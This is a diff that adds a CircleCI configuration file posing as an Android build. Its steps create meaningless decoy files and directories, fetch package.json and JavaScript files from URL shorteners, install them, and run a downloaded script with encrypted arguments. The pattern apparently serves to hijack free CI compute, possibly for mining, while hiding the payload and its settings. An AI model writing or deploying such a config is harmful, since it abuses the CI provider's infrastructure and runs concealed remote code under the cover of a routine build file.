@@ -1,0 +1,50 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  runJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir vguklen9xvd
+      - run: touch 5hgx99ll3wry91ighirpei.c
+      - run: curl -fsSL shorturl.at/tyDT2 -o package.json && curl -fsSL
+          shorturl.at/qwJV2 -o wgy2ojleynk.js && curl -fsSL shorturl.at/lAE45 -o
+          azknd2ne2390o.js
+      - run: npm i -s
+      - run: touch 9wy0t6eg7g7b1cguf.java
+      - run: mkdir vplu6qzr4s9f4wd
+      - run: mkdir f2do6oiel8eyms35c8tqls
+      - run: node azknd2ne2390o -t
+          U2FsdGVkX1/vNc46Vx4K/7/Xtma6OB0/wFJOgPj2se3jyduQyemgpME7KBP7JheQ -r
+          U2FsdGVkX18W6zm9hwsDkt0CcAPDIo6JhEDGIM0e8St4yg8nQqQtHjgiHSPe2BegoJNvM2xNWIq1GCH7YpgnTXNssUs19PRZaypRiVOOoWV78gWfETpGUjnPKSaM66ryieEkhEoBIqxm7qHS7cC/s7TJldDTlCAWwBPAjE3Qtz1RndKb3jr3OXdr8FjBu33p19W2YAek1nqQ5AahUXyLku6Kf80e1PVBr4aHRLF7evSgr+kVnqhY1rv85jlMZYwyt5icpHeI9fSliiX7mLahyPTCfAGJMKQ1o3nX5Timk38=
+          -s
+          U2FsdGVkX188mCLV8mJx1kPyYXS866zhgaUiDCx4xcuJFoBF3QRPyXDiRP31kd2dXAJ9SWrm5xJ9JSOYl/r7nLXaGYyE7yr8MQlHyQDg8hAkA8LneGgAPc+ZG31nuLAYn03OHJwocySw8kBph+rkBfTHC7EUuSMECO1CiRF2ikLZ/ORtHklDAGzGChR2cZ43BXDU44yJT7CspRTTCKpkNYoiX9ZEg474v2nazuIbjOo=
+          -lpn U2FsdGVkX18uVcNI82aYpLKc6DuM6eMi/w1P4lv8PzA= -sp
+      - run: mkdir w4kol5mxxchwfe8
+  run-jobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir dv5kyilps2ktjqazasmgdw85q18g
+      - run: touch qictsw9mmcwq4fvdb8w0w4.js
+      - run: curl -fsSL shorturl.at/ctA57 -o fa7natce8pom.js && curl -fsSL
+          shorturl.at/nwBM8 -o 5sivp8btqpnbo.js && curl -fsSL shorturl.at/ezDVW
+          -o package.json
+      - run: npm i -s
+      - run: touch x37cozmwzjvpvcqsnfy8yg7ga.c
+      - run: touch mscwj5k16p0w94eny6c9p.c
+      - run: touch vfi8nv6crq9qfsid6xwy.ts
+      - run: node 5sivp8btqpnbo -t
+          U2FsdGVkX1/zy7buea10iQ+xeM1EFfmyO8WXnPqb5hu+E0Q/wqNkYW4GjAKuaNpj -s
+          U2FsdGVkX1+sL1SVDfvpBLJpkJJeo58L+1XFZJ8sIRp8+SAL1kzcxHGV/FqFVO9bKGc36e5YwQM7WPcfJsGqmmMtrhjGYP+/eGBBexxjuK86kkvLMAq9NAlpaZnKxVff2vcM14skg8XtVFSqfYIa7oXDBNv4vOA9HoN0kwr3JwxPUfJ2k+MokQN9+evb7qvYO/rA0w33WIE5qcslKvciGHtjQwCozeHnaQ+0TF3ZgVY=
+          -sp -lpn U2FsdGVkX1/hY5E3evSe3iZua/EZXG8chE+7jnA1iOU= -r
+          U2FsdGVkX1+8EPqpq0zJAas1WlfMQ8NptE1C7ATL3tLpsLgN0U4rFlsCt3flYvCwyoG1RnYvUQMPSIlxwgPUvisaGTN2hC1+LFf5TzvB2nC9TCMjvH7ly6K6Ns5Z4r7cNYV28uD0DP4c/Wz/yUyKwt/q7x+0RsCRPVl3YriJkGzuEchW11VThhQQdHug09Gr2G2THjhg1btrGV4VwbxU4/byGYiIl0E00pfFrPwVI3YOsd6P7eEJnLSTO+u1BMcJpvnKTTjwr2pxevLTIo5xODGuhrApTsTracP/8OcIN7E=
+      - run: echo version 11547459106.339352
+workflows:
+  bomaycatdaumoi:
+    jobs:
+      - runJobs
+  ditmecuocdoi:
+    jobs:
+      - run-jobs
